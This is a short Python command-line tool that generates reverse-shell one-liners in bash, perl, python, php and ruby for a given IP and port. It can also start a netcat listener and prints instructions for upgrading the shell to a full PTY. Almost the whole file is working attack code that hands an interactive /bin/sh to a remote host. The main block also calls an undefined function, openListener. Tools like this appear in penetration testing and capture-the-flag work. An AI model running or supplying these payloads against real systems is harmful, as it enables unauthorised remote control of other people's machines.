
import os
import click


# Reverse Shell One-Liner Payloads

BASH="""bash -i >& /dev/tcp/<ip>/<port> 0>&1\n\nexec 5<>/dev/tcp/<ip>/<port>\ncat <&5 | while read line; do $line 2>&5 >&5; done"""

PERL="""perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""

PYTHON="""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

PHP="""php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'"""

RUBY="""ruby -rsocket -e'f=TCPSocket.open("<ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

# Parse User option and return the correct reverse shell payload
def revType(payload):
    if payload == "python":
        return PYTHON
    elif payload == "bash":
        return BASH
    elif payload == "perl":
        return PERL
    elif payload == "php":
        return PHP
    elif payload == "ruby":
        return RUBY 
    else:
        return "[ERROR] Invalid type"


"""
    Name: printrev
    Param:
        types: (str) Type of revershell payload 
        ip: (str) IP of the user
        port: (str) PORT of the user 
        listener: (boolean) True: Open a netcat listener. False: Doesn't open listener

    Return:
        (str) Reverse shell payload with user's IP and PORT 
        [optional] A netcat listener with sh to full pty instruction 
"""
@click.command()
@click.option('--types','-t',help='type of reverse shell payload (python, bash, perl, php, ruby)', required=True)
@click.option('--listener', '-l', help='Opens a netcat listener', is_flag=True)
@click.argument('ip', required=True)
@click.argument('port', required=True)
def printrev(types, ip, port, listener):
    inputType = revType(types)

    payload1 = inputType.replace("<ip>", ip)
    finalPayload = payload1.replace("<port>", port)

    print(finalPayload)
    print()

    if (listener):
        helper = """[Upgrade to full pty]\npython -c 'import pty; pty.spawn("/bin/bash")'\nCtrl-Z\nstty raw -echo\nfg\nreset\n"""

        print(helper)
        
        cmd = "nc -lvnp " + port
        os.system(cmd)

if __name__ == "__main__":
    print()
    printrev()
    print()
    openListener()
    print()

